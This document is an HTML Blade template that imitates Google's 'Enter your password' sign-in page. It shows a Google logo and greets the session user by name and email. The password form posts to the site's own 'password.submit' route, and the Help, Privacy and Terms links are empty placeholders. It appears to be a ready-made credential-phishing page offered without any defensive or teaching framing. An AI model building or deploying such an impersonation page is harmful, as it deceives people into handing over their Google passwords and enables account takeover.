<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google</title>
    <meta name="color-scheme" content="light dark">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="next.css">
</head>
<body>
    <div class="login-container">
        <div class="left-section">
            <picture>
                <source srcset="{{ asset('R-dark.png')}}" media="(prefers-color-scheme: dark)">
                <img src="{{ asset('R.png')}}" alt="Google Logo" class="google-g">
            </picture>
            <h1>Hi {{ session('name') }}</h1>
            <div class="email-pill">
              <div class="initial">
             {{ strtoupper(substr(session('name'), 0, 1)) }}
                 </div>
             <span class="email-text">{{ session('email') }}</span>
            </div>
             </div>
        <div class="right-section">
            <form action="{{ route('password.submit') }}" method="POST">
                @csrf
                <div class="input-group">
                    <label for="password">Enter your password</label>
                    <input type="password" name="password" id="password" required>
                </div>

                <div class="show-password">
                    <input type="checkbox" id="showPassword" onclick="togglePassword()"> 
                    <label for="showPassword">Show password</label>
                </div>

                <div class="actions">
                    <a href="#">Forgot password?</a>
                    <button type="submit" class="btn-next">Next</button>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <span>English (United States)</span>
        <div class="links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>

    <script>
        function togglePassword() {
            var input = document.getElementById("password");
            input.type = input.type === "password" ? "text" : "password";
        }
    </script>
</body>
</html>
